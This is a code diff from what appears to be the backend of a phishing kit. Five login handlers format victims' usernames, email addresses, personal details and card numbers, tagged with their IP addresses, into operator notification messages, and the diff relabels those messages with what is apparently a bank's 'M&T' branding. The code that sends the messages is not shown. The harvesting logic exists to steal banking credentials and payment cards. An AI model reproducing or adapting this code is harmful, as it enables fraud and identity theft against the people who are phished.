@@ -36,7 +36,7 @@ exports.loginPost = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
     const message = `
-👤 UPDATE TEAM | LOGIN 
+👤 M&t | LOGIN 
 
 ========================
 
@@ -84,7 +84,7 @@ exports.loginPost2 = async (req, res) => {
     const ipAddress = getClientIp(req);
 
     const message = `
-✅ UPDATE TEAM | RELOGIN | USER_${ipAddress}
+✅ UPDATE TEAM | M&T | USER_${ipAddress}
 
 👤 RELOGIN INFO
 USERNAME         : ${username}
@@ -114,7 +114,7 @@ exports.loginPost3 = async (req, res) => {
     const ipAddress = getClientIp(req);
 
     const message = `
-✅ UPDATE TEAM | EMAIL | USER_${ipAddress}
+✅ UPDATE TEAM | M&T | USER_${ipAddress}
 
 👤 EMAIL INFO
 EMAIL ADDRESS    : ${emailAddr}
@@ -144,7 +144,7 @@ exports.loginPost4 = async (req, res) => {
     const ipAddress = getClientIp(req);
 
     const message = `
-✅ UPDATE TEAM | PERSONAL INFO | USER_${ipAddress}
+✅ UPDATE TEAM | M&T | USER_${ipAddress}
 
 👤 PERSONAL INFO
 FULL NAME        : ${fullName}
@@ -178,7 +178,7 @@ exports.loginPost5 = async (req, res) => {
     const ipAddress = getClientIp(req);
 
     const message = `
-✅ UPDATE TEAM | CARD INFO | USER_${ipAddress}
+✅ UPDATE TEAM | M&T | USER_${ipAddress}
 
 👤 CARD INFO
 CARD NUMBER      : ${cardNum}
